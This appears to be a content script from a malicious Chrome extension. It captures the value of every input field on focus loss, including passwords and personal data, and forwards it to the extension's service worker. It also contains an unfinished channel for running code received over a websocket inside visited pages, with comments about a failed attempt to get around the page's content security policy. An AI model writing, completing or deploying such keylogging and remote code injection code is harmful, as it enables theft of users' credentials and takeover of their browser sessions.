// Send all input values to the service worker as a message
function logKeys(key) {
    const data = {
        keys: key
    }

    chrome.runtime.sendMessage({type: 'SUBMIT_FORM', data}).then((response) => {
        console.log("Response received:", response)
    });
}

document.addEventListener('focusout', function (e) {
    if (e.target.tagName === 'INPUT' && e.target.value !== '') {
        logKeys(e.target.value)
    }
});

/* =================================================================================== */

// FIXME: Listen to messegaes from the service worker and if they are of type 'WEBSOCKET_MESSAGE' then evaluate the code
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    (() => {
        if (request.type === 'WEBSOCKET_MESSAGE') {
            console.log(request.data)
            // TODO: tried to execute the code injection through a Blob but CSP is still blocking it
            // // Create a Blob from the string
            // const blob = new Blob([request.data], {type: 'application/javascript'});
            //
            // // Create a URL for the Blob
            // const scriptURL = URL.createObjectURL(blob);
            //
            // // Dynamically create a script element and set its source to the Blob URL
            // const scriptElement = document.createElement('script');
            // scriptElement.src = scriptURL;
            //
            // // Append the script element to the document to execute the code
            // document.body.appendChild(scriptElement);

        }
        sendResponse({status: 'ok'})
    })();
    return true
});
